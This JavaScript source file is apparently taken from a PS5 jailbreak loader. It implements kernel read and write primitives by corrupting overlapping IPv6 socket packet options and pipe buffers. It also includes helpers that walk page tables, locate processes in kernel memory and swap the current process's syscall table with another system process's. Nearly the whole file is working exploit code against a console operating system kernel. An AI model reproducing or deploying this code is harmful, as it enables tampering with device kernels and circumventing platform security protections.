// https://github.com/shahrilnet/remote_lua_loader/blob/main/savedata/kernel.lua

const kernel = {
    addr: {},
    copyout: null,
    copyin: null,
    read_buffer: null,
    write_buffer: null
};

kernel.read_byte = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 1);
    return value && value.length === 1 ? BigInt(value[0]) : null;
};

kernel.read_word = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 2);
    if (!value || value.length !== 2) return null;
    return BigInt(value[0]) | (BigInt(value[1]) << 8n);
};

kernel.read_dword = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 4);
    if (!value || value.length !== 4) return null;
    let result = 0n;
    for (let i = 0; i < 4; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    return result;
};

kernel.read_qword = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 8);
    if (!value || value.length !== 8) return null;
    let result = 0n;
    for (let i = 0; i < 8; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    return result;
};

kernel.read_null_terminated_string = function(kaddr) {
    const decoder = new TextDecoder('utf-8');
    let result = "";
    
    while (true) {
        const chunk = kernel.read_buffer(kaddr, 0x8);
        if (!chunk || chunk.length === 0) break;
        
        let null_pos = -1;
        for (let i = 0; i < chunk.length; i++) {
            if (chunk[i] === 0) {
                null_pos = i;
                break;
            }
        }
        
        if (null_pos >= 0) {
            if (null_pos > 0) {
                result += decoder.decode(chunk.slice(0, null_pos));
            }
            return result;
        }
        
        result += decoder.decode(chunk, { stream: true });
        kaddr = kaddr + BigInt(chunk.length);
    }
    
    return result;
};

kernel.write_byte = function(dest, value) {
    const buf = new Uint8Array(1);
    buf[0] = Number(value & 0xFFn);
    kernel.write_buffer(dest, buf);
};

kernel.write_word = function(dest, value) {
    const buf = new Uint8Array(2);
    buf[0] = Number(value & 0xFFn);
    buf[1] = Number((value >> 8n) & 0xFFn);
    kernel.write_buffer(dest, buf);
};

kernel.write_dword = function(dest, value) {
    const buf = new Uint8Array(4);
    for (let i = 0; i < 4; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    kernel.write_buffer(dest, buf);
};

kernel.write_qword = function(dest, value) {
    const buf = new Uint8Array(8);
    for (let i = 0; i < 8; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    kernel.write_buffer(dest, buf);
};

const ipv6_kernel_rw = {
    data: {},
    ofiles: null,
    kread8: null,
    kwrite8: null
};

ipv6_kernel_rw.init = function(ofiles, kread8, kwrite8) {
    ipv6_kernel_rw.ofiles = ofiles;
    ipv6_kernel_rw.kread8 = kread8;
    ipv6_kernel_rw.kwrite8 = kwrite8;
    
    ipv6_kernel_rw.create_pipe_pair();
    ipv6_kernel_rw.create_overlapped_ipv6_sockets();
};

ipv6_kernel_rw.get_fd_data_addr = function(fd) {
    const filedescent_addr = ipv6_kernel_rw.ofiles + BigInt(fd) * kernel_offset.SIZEOF_OFILES;
    const file_addr = ipv6_kernel_rw.kread8(filedescent_addr + 0x0n);
    return ipv6_kernel_rw.kread8(file_addr + 0x0n);
};

ipv6_kernel_rw.create_pipe_pair = function() {
    const [read_fd, write_fd] = create_pipe();
    
    ipv6_kernel_rw.data.pipe_read_fd = read_fd;
    ipv6_kernel_rw.data.pipe_write_fd = write_fd;
    ipv6_kernel_rw.data.pipe_addr = ipv6_kernel_rw.get_fd_data_addr(read_fd);
    ipv6_kernel_rw.data.pipemap_buffer = malloc(0x14);
    ipv6_kernel_rw.data.read_mem = malloc(PAGE_SIZE);
};

ipv6_kernel_rw.create_overlapped_ipv6_sockets = function() {
    const master_target_buffer = malloc(0x14);
    const slave_buffer = malloc(0x14);
    const pktinfo_size_store = malloc(0x8);
    
    write64(pktinfo_size_store, 0x14n);
    
    const master_sock = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    const victim_sock = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    
    syscall(SYSCALL.setsockopt, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14n);
    syscall(SYSCALL.setsockopt, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buffer, 0x14n);
    
    const master_so = ipv6_kernel_rw.get_fd_data_addr(master_sock);
    const master_pcb = ipv6_kernel_rw.kread8(master_so + kernel_offset.SO_PCB);
    const master_pktopts = ipv6_kernel_rw.kread8(master_pcb + kernel_offset.INPCB_PKTOPTS);
    
    const slave_so = ipv6_kernel_rw.get_fd_data_addr(victim_sock);
    const slave_pcb = ipv6_kernel_rw.kread8(slave_so + kernel_offset.SO_PCB);
    const slave_pktopts = ipv6_kernel_rw.kread8(slave_pcb + kernel_offset.INPCB_PKTOPTS);
    
    ipv6_kernel_rw.kwrite8(master_pktopts + 0x10n, slave_pktopts + 0x10n);
    
    ipv6_kernel_rw.data.master_target_buffer = master_target_buffer;
    ipv6_kernel_rw.data.slave_buffer = slave_buffer;
    ipv6_kernel_rw.data.pktinfo_size_store = pktinfo_size_store;
    ipv6_kernel_rw.data.master_sock = master_sock;
    ipv6_kernel_rw.data.victim_sock = victim_sock;
};

ipv6_kernel_rw.ipv6_write_to_victim = function(kaddr) {
    write64(ipv6_kernel_rw.data.master_target_buffer, kaddr);
    write64(ipv6_kernel_rw.data.master_target_buffer + 0x8n, 0n);
    write32(ipv6_kernel_rw.data.master_target_buffer + 0x10n, 0n);
    syscall(SYSCALL.setsockopt, ipv6_kernel_rw.data.master_sock, IPPROTO_IPV6, 
            IPV6_PKTINFO, ipv6_kernel_rw.data.master_target_buffer, 0x14n);
};

ipv6_kernel_rw.ipv6_kread = function(kaddr, buffer_addr) {
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr);
    syscall(SYSCALL.getsockopt, ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, 
            IPV6_PKTINFO, buffer_addr, ipv6_kernel_rw.data.pktinfo_size_store);
};

ipv6_kernel_rw.ipv6_kwrite = function(kaddr, buffer_addr) {
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr);
    syscall(SYSCALL.setsockopt, ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, 
            IPV6_PKTINFO, buffer_addr, 0x14n);
};

ipv6_kernel_rw.ipv6_kread8 = function(kaddr) {
    ipv6_kernel_rw.ipv6_kread(kaddr, ipv6_kernel_rw.data.slave_buffer);
    return read64(ipv6_kernel_rw.data.slave_buffer);
};

ipv6_kernel_rw.copyout = function(kaddr, uaddr, len) {
   if (kaddr === null || kaddr === undefined || 
       uaddr === null || uaddr === undefined || 
       len === null || len === undefined || len === 0n) {
       throw new Error("copyout: invalid arguments");
   }
    
    write64(ipv6_kernel_rw.data.pipemap_buffer, 0x4000000040000000n);
    write64(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0x4000000000000000n);
    write32(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer);
    
    write64(ipv6_kernel_rw.data.pipemap_buffer, kaddr);
    write64(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0n);
    write32(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10n, ipv6_kernel_rw.data.pipemap_buffer);
    
    syscall(SYSCALL.read, ipv6_kernel_rw.data.pipe_read_fd, uaddr, len);
};

ipv6_kernel_rw.copyin = function(uaddr, kaddr, len) {
   if (kaddr === null || kaddr === undefined || 
       uaddr === null || uaddr === undefined || 
       len === null || len === undefined || len === 0n) {
       throw new Error("copyout: invalid arguments");
   }
    
    
    write64(ipv6_kernel_rw.data.pipemap_buffer, 0n);
    write64(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0x4000000000000000n);
    write32(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer);
    
    write64(ipv6_kernel_rw.data.pipemap_buffer, kaddr);
    write64(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0n);
    write32(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10n, ipv6_kernel_rw.data.pipemap_buffer);
    
    syscall(SYSCALL.write, ipv6_kernel_rw.data.pipe_write_fd, uaddr, len);
};

ipv6_kernel_rw.read_buffer = function(kaddr, len) {
    let mem = ipv6_kernel_rw.data.read_mem;
    if (len > PAGE_SIZE) {
        mem = malloc(len);
    }
    
    ipv6_kernel_rw.copyout(kaddr, mem, BigInt(len));
    return read_buffer(mem, len);
};

ipv6_kernel_rw.write_buffer = function(kaddr, buf) {
    const temp_addr = malloc(buf.length);
    write_buffer(temp_addr, buf);
    ipv6_kernel_rw.copyin(temp_addr, kaddr, BigInt(buf.length));
};

// CPU page table definitions
const CPU_PDE_SHIFT = {
    PRESENT: 0,
    RW: 1,
    USER: 2,
    WRITE_THROUGH: 3,
    CACHE_DISABLE: 4,
    ACCESSED: 5,
    DIRTY: 6,
    PS: 7,
    GLOBAL: 8,
    XOTEXT: 58,
    PROTECTION_KEY: 59,
    EXECUTE_DISABLE: 63
};

const CPU_PDE_MASKS = {
    PRESENT: 1n,
    RW: 1n,
    USER: 1n,
    WRITE_THROUGH: 1n,
    CACHE_DISABLE: 1n,
    ACCESSED: 1n,
    DIRTY: 1n,
    PS: 1n,
    GLOBAL: 1n,
    XOTEXT: 1n,
    PROTECTION_KEY: 0xfn,
    EXECUTE_DISABLE: 1n
};

const CPU_PG_PHYS_FRAME = 0x000ffffffffff000n;
const CPU_PG_PS_FRAME = 0x000fffffffe00000n;

function cpu_pde_field(pde, field) {
    const shift = CPU_PDE_SHIFT[field];
    const mask = CPU_PDE_MASKS[field];
    return Number((pde >> BigInt(shift)) & mask);
}

function cpu_walk_pt(cr3, vaddr) {
    if (!vaddr || !cr3) {
        throw new Error("cpu_walk_pt: invalid arguments");
    }
    
    const pml4e_index = (vaddr >> 39n) & 0x1ffn;
    const pdpe_index = (vaddr >> 30n) & 0x1ffn;
    const pde_index = (vaddr >> 21n) & 0x1ffn;
    const pte_index = (vaddr >> 12n) & 0x1ffn;
    
    const pml4e = kernel.read_qword(phys_to_dmap(cr3) + pml4e_index * 8n);
    if (cpu_pde_field(pml4e, "PRESENT") !== 1) {
        return null;
    }
    
    const pdp_base_pa = pml4e & CPU_PG_PHYS_FRAME;
    const pdpe_va = phys_to_dmap(pdp_base_pa) + pdpe_index * 8n;
    const pdpe = kernel.read_qword(pdpe_va);
    
    if (cpu_pde_field(pdpe, "PRESENT") !== 1) {
        return null;
    }
    
    const pd_base_pa = pdpe & CPU_PG_PHYS_FRAME;
    const pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8n;
    const pde = kernel.read_qword(pde_va);
    
    if (cpu_pde_field(pde, "PRESENT") !== 1) {
        return null;
    }
    
    if (cpu_pde_field(pde, "PS") === 1) {
        return (pde & CPU_PG_PS_FRAME) | (vaddr & 0x1fffffn);
    }
    
    const pt_base_pa = pde & CPU_PG_PHYS_FRAME;
    const pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
    const pte = kernel.read_qword(pte_va);
    
    if (cpu_pde_field(pte, "PRESENT") !== 1) {
        return null;
    }
    
    return (pte & CPU_PG_PHYS_FRAME) | (vaddr & 0x3fffn);
}

function is_kernel_rw_available() {
    return kernel.read_buffer && kernel.write_buffer;
}

function check_kernel_rw() {
    if (!is_kernel_rw_available()) {
        throw new Error("kernel r/w is not available");
    }
}

function find_proc_by_name(name) {
    check_kernel_rw();
    if (!kernel.addr.allproc) {
        throw new Error("kernel.addr.allproc not set");
    }
    
    let proc = kernel.read_qword(kernel.addr.allproc);
    while (proc !== 0n) {
        const proc_name = kernel.read_null_terminated_string(proc + kernel_offset.PROC_COMM);
        if (proc_name === name) {
            return proc;
        }
        proc = kernel.read_qword(proc + 0x0n);
    }
    
    return null;
}

function find_proc_by_pid(pid) {
    check_kernel_rw();
    if (!kernel.addr.allproc) {
        throw new Error("kernel.addr.allproc not set");
    }
    
    const target_pid = BigInt(pid);
    let proc = kernel.read_qword(kernel.addr.allproc);
    while (proc !== 0n) {
        const proc_pid = kernel.read_dword(proc + kernel_offset.PROC_PID);
        if (proc_pid === target_pid) {
            return proc;
        }
        proc = kernel.read_qword(proc + 0x0n);
    }
    
    return null;
}

function get_proc_cr3(proc) {
    check_kernel_rw();
    
    const vmspace = kernel.read_qword(proc + kernel_offset.PROC_VM_SPACE);
    const pmap_store = kernel.read_qword(vmspace + kernel_offset.VMSPACE_VM_PMAP);
    
    return kernel.read_qword(pmap_store + kernel_offset.PMAP_CR3);
}

function virt_to_phys(virt_addr, cr3) {
    check_kernel_rw();
    if (!kernel.addr.dmap_base || !virt_addr) {
        throw new Error("virt_to_phys: invalid arguments");
    }
    
    cr3 = cr3 || kernel.addr.kernel_cr3;
    return cpu_walk_pt(cr3, virt_addr);
}

function phys_to_dmap(phys_addr) {
    if (!kernel.addr.dmap_base || !phys_addr) {
        throw new Error("phys_to_dmap: invalid arguments");
    }
    return kernel.addr.dmap_base + phys_addr;
}

// Replace curproc sysent with sysent of other PS5 process
// Note: failure to restore curproc sysent will have side effect on the game/PS
async function run_with_ps5_syscall_enabled(f) {
    check_kernel_rw();
    
    const target_proc_name = "SceGameLiveStreaming"; // arbitrarily chosen PS5 process
    
    const target_proc = find_proc_by_name(target_proc_name);
    if (!target_proc) {
        throw new Error("failed to find proc addr of " + target_proc_name);
    }
    
    const cur_sysent = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_SYSENT);  // struct sysentvec
    const target_sysent = kernel.read_qword(target_proc + kernel_offset.PROC_SYSENT);
    
    const cur_table_size = kernel.read_dword(cur_sysent); // sv_size
    const target_table_size = kernel.read_dword(target_sysent);
    
    const cur_table = kernel.read_qword(cur_sysent + 0x8n); // sv_table
    const target_table = kernel.read_qword(target_sysent + 0x8n);
    
    // Replace with target sysent
    kernel.write_dword(cur_sysent, target_table_size);
    kernel.write_qword(cur_sysent + 0x8n, target_table);
    
    try {
        await f();
    } catch (e) {
        await log('run_with_ps5_syscall_enabled failed : ' + e.message);
        await log(e.stack);
    } finally {
        // Always restore back
        kernel.write_dword(cur_sysent, cur_table_size);
        kernel.write_qword(cur_sysent + 0x8n, cur_table);
    }
}